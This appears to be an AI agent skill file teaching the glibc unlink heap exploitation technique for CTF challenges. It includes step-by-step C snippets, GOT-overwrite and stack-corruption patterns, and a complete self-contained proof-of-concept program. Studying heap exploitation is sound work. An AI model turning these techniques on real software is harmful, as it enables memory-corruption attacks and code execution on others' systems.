---
name: unlink-attack
description: How to understand and implement the unlink heap exploitation attack. Use this skill whenever the user mentions heap exploitation, unlink attacks, CTF challenges with heap vulnerabilities, glibc heap corruption, or binary exploitation involving malloc/free. Also trigger when users ask about bypassing ASLR/stack canaries through heap attacks, or when they're working on challenges that involve chunk manipulation, fake chunks, or heap metadata corruption.
---

# Unlink Attack Guide

The unlink attack is a classic heap exploitation technique that allows you to corrupt pointers by manipulating the doubly-linked list structure of freed chunks in glibc's malloc implementation.

## What This Attack Does

The unlink attack allows you to **change a pointer to a chunk to point 3 addresses before itself**. This is powerful because:

- If the pointer was on the stack, you can leak sensitive info or modify the return address (potentially bypassing canaries)
- If the pointer is in an array of allocations, you can make other pointers point to arbitrary addresses (like the GOT)
- You gain arbitrary read/write capabilities in strategic locations

## When This Attack Works

### Requirements

1. **Control over memory content** - You need to control the contents of at least one chunk (chunk1) to forge a fake chunk structure
2. **Stack leak or address knowledge** - You need to know where pointers are stored to set up the fake chunk's `fd` and `bk` pointers correctly
3. **No tcache** - This attack doesn't work with glibc 2.26+ when tcache is enabled (tcache bypasses the unlink operation)
4. **Contiguous chunks** - You need at least two chunks where you can control chunk1's content and chunk2's header

### When to Use This Attack

- CTF challenges with heap vulnerabilities and no tcache
- When you need to corrupt a pointer to gain arbitrary write
- When you want to bypass stack canaries by writing to the stack through heap corruption
- When you have an array of pointers to allocations that you can corrupt

## The Attack Mechanics

### Step 1: Set Up Two Chunks

```c
// Allocate two large chunks (non-fastbin size)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
```

### Step 2: Forge a Fake Chunk in Chunk1

The fake chunk needs specific `fd` and `bk` pointers to pass glibc's security checks:

```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];
};

fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3);  // Points to where chunk1 is stored
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2);  // Points to where chunk1 is stored
```

**Why these offsets?** The unlink operation checks that `P->fd->bk == P` and `P->bk->fd == P`. By pointing both `fd` and `bk` to the location where `chunk1` is stored (with offsets -3 and -2), both checks pass because they both resolve to the same memory location.

### Step 3: Modify Chunk2's Header

```c
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // Size of chunk1's data region
chunk2_hdr->size &= ~1;          // Unset prev_in_use bit
```

This tells malloc that the previous chunk (our fake chunk) is free and has the correct size.

### Step 4: Trigger the Unlink

```c
free(chunk2);
```

When chunk2 is freed, malloc consolidates it with the previous chunk (our fake chunk). The unlink operation executes:

```
fake_chunk->fd->bk = fake_chunk->bk
fake_chunk->bk->fd = fake_chunk->fd
```

Since both `fd->bk` and `bk->fd` point to the same location (where `chunk1` is stored on the stack), the second assignment overwrites the first. This changes `chunk1` to point 3 addresses before itself.

### Step 5: Exploit the Corrupted Pointer

Now `chunk1` points to a different location. If you can control chunk1's content again:

```c
// chunk1 now points to a different location
chunk1[3] = (unsigned long long)data;  // Point to victim data

// Overwrite victim's data
chunk1[0] = 0x002164656b636168LL;
```

## Common Exploitation Patterns

### Pattern 1: Stack Corruption

If the pointer to chunk1 is stored on the stack:
- After the unlink, chunk1 points 3 addresses before itself on the stack
- You can overwrite local variables or the return address
- This can bypass canaries since you're writing through heap corruption, not a buffer overflow

### Pattern 2: Array of Pointers

If chunk1 is in an array of malloc'd addresses:
- Corrupt the array entry to point to a different location
- Use another vulnerability to write through the corrupted pointer
- Point to GOT entries to leak libc or achieve RCE

### Pattern 3: GOT Overwrite

1. Use unlink to corrupt a pointer in an allocation array
2. Write through the corrupted pointer to point to GOT
3. Overwrite function addresses (e.g., `atoi`) with one_gadget or shellcode

## Complete Working Example

```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];
};

int main() {
  unsigned long long *chunk1, *chunk2;
  struct chunk_structure *fake_chunk, *chunk2_hdr;
  char data[20];

  // Allocate two chunks
  chunk1 = malloc(0x8000);
  chunk2 = malloc(0x8000);
  
  printf("Chunk1: %p\n", chunk1);
  printf("Chunk2: %p\n", chunk2);

  // Forge fake chunk in chunk1
  fake_chunk = (struct chunk_structure *)chunk1;
  fake_chunk->size = 0x8000;
  fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3);
  fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2);

  // Modify chunk2's header
  chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
  chunk2_hdr->prev_size = 0x8000;
  chunk2_hdr->size &= ~1;

  // Trigger unlink
  free(chunk2);
  
  printf("After free - Chunk1: %p\n", chunk1);

  // Now chunk1 points to a different location
  // Exploit by writing through it
  chunk1[3] = (unsigned long long)data;
  strcpy(data, "Victim's data");
  chunk1[0] = 0x002164656b636168LL;

  printf("%s\n", data);
  return 0;
}
```

## Key Considerations

### Security Checks to Bypass

1. **Size validation**: `corrupted size vs. prev_size while consolidating` - Ensure fake chunk's size matches prev_size in next chunk
2. **Unlink validation**: `P->fd->bk == P` and `P->bk->fd == P` - Point both fd and bk to the same location
3. **In-use bit**: Unset the prev_in_use bit in the next chunk's header

### Limitations

- **Tcache (glibc 2.26+)**: Tcache bypasses the unlink operation, making this attack ineffective
- **ASLR**: You need a leak to know where pointers are stored
- **Stack canaries**: Still need to bypass or leak the canary in most cases

### Modern Alternatives

For glibc 2.26+, consider:
- **Tcache poisoning** - Simpler and more reliable
- **Unsorted bin attacks** - Still effective in many cases
- **House of force** - For arbitrary allocation control

## References

- [heap-exploitation.dhavalkapil.com - Unlink Exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
- [CTF Writeup: HITCON 14 - Stkof](https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html)
- [CTF Writeup: ZCTF 16 - Note2](https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html)
- [CTF Writeup: CSAW 17 - Minesweeper](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html)

## Quick Checklist

When approaching an unlink attack:

- [ ] Can I control the content of one chunk?
- [ ] Can I modify the header of an adjacent chunk?
- [ ] Do I know where the pointer is stored (stack leak or other info leak)?
- [ ] Is tcache disabled or can I bypass it?
- [ ] What do I want to overwrite with the corrupted pointer?
- [ ] Do I have a way to write through the corrupted pointer after the unlink?
